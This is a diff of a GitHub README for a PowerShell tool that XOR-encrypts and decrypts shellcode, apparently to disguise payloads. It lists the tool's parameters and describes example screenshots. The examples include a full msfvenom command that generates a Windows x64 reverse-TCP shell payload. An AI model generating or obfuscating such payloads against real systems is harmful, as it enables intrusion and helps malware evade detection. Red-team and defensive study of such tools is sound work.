@@ -1,31 +1,47 @@
-# PSShellcodeEncoder
-My first and a simple powershell script which can be used to encode your shellcode!
+# PSShellcodeCrypter
+My first and a simple PowerShell script which can be used to XOR encrypt your shellcode!
 
-## Encoding Process 
-- The encoding process used is very simple (as of now, will be upgrading it in the future) :
-  -  Bitwise right shift operator is used on the original shellcode which will move the bits by the user specified amount
-  -  The shifted bytes are then incremented by 1
-  -  The shellcode is then finally printed out in hex format
- 
-## Installation and Usage :
+
+## Installation and Usage:
   ### Installation : 
-  1. Clone the repository using : `git clone https://github.com/Vedant-Bhalgama/PSShellcodeEncoder`
-  2. Open up Powershell and import the script in it using : `Import-Module .\ssencoder.ps1`
+  1. Clone the repository using : `git clone https://github.com/Vedant-Bhalgama/PSShellcodeCrypter`
+  2. Open up Powershell and import the script in it using : `Import-Module .\ssencrypt.ps1`
 
-  ### Usage : 
-  #### Command help and syntax
-  <img width="803" alt="image" src="https://github.com/user-attachments/assets/0eefa615-1a10-4921-8f7d-899b00823b94">
-  
-  - Specify original shellcode using the `-OriginalShellcode` parameter and the number of bits to shift by using the `-ShiftPosition` parameter.
-  - If you want to write the shellcode to a file, Specify the `-WriteToFile` parameter along with the filename where you want to store it into
-  
+  ### Usage :
+  1. Using `XOR-Encrypt` :
+     
+     - XOR-Encrypt supported parameters :
+       - `-OriginalShellcode` :
+          - Specify the original shellcode in an array to encrypt
+       - `-Key` :
+          - Specify the key to use in XOR encryption of the shellcode
+       - `-WriteToFile` :
+          - If you wish to output the encrypted shellcode to a file, specify this parameter along with the file name (Encrypted shellcode will be outputted in C usable format)
 
-## Example Usage :
-  ### Encoding of a shellcode generated via msfvenom :
-  <img width="876" alt="image" src="https://github.com/user-attachments/assets/f871a18d-935b-466b-9f05-b492141357ad">
+<img width="823" alt="image" src="https://github.com/user-attachments/assets/56dcba43-e34f-4302-b7b4-2e9279d0647c">
 
-  - The shellcode generated is stored in the `$shellcode` variable (`windows/x64/shell_reverse_tcp`). The amount of bits to shift by is set to 2
-  ### Encoding of a shellcode generated via msfvenom but stored locally : 
-  <img width="878" alt="image" src="https://github.com/user-attachments/assets/0e6a749d-dea5-4d6d-9647-f30a46a9cb13">
+  2. Using `XOR-Decrypt` :
+
+     - XOR-Encrypt supported parameters :
+       - `-EncryptedShellcode` :
+          - Specify the encrypted shellcode in an array to decrypt
+       - `-Key` :
+          - Specify the key to use in XOR decryption of the shellcode
+
+<img width="855" alt="image" src="https://github.com/user-attachments/assets/c8eedd5b-2a37-4a08-8a14-a66d7d173119">
+
+
+## Examples :
+  ### XOR Encrypting a shellcode generated using MSFVenom :
   
-  - Similar as above but the shellcode is stored in a file on-disk
+  - The shellcode is stored in an array named `$shellcode`, generated using MSFVenom (`msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f csharp`)
+
+<img width="1052" alt="image" src="https://github.com/user-attachments/assets/15a18733-2185-49b1-b4f0-a65975b9a0fc">
+
+  - Another example but encrypted shellcode is written to a file using `-WriteToFile`
+
+<img width="812" alt="image" src="https://github.com/user-attachments/assets/6d4786c5-2919-47ba-bb52-fba080306658">
+
+ <img width="1234" alt="image" src="https://github.com/user-attachments/assets/11132881-12ec-47d8-bd84-380451805e01">
+
+  
